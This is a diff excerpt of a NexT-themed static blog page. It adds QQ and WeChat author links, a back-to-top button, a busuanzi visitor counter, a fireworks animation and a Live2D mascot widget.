+        <a href="https://qm.qq.com/cgi-bin/qm/qr?k=Cf0mAXjJZxgcIHCewDi3UHVkCkGVm2G4&noverify=0" title="QQ → https:&#x2F;&#x2F;qm.qq.com&#x2F;cgi-bin&#x2F;qm&#x2F;qr?k&#x3D;Cf0mAXjJZxgcIHCewDi3UHVkCkGVm2G4&amp;noverify&#x3D;0" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://u.wechat.com/EMK6P81EvYrsrQPVguXPj0A" title="WeChat → https:&#x2F;&#x2F;u.wechat.com&#x2F;EMK6P81EvYrsrQPVguXPj0A" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>WeChat</a>
+      </span>
   </div>
 
 
 
       </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
 
     </div>
   </aside>
@@ -463,6 +510,26 @@
   </div>
 
         
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
 
 
 
@@ -531,5 +598,13 @@ NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
 });
 </script>
 
-</body>
+
+ 
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+  
+ 
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
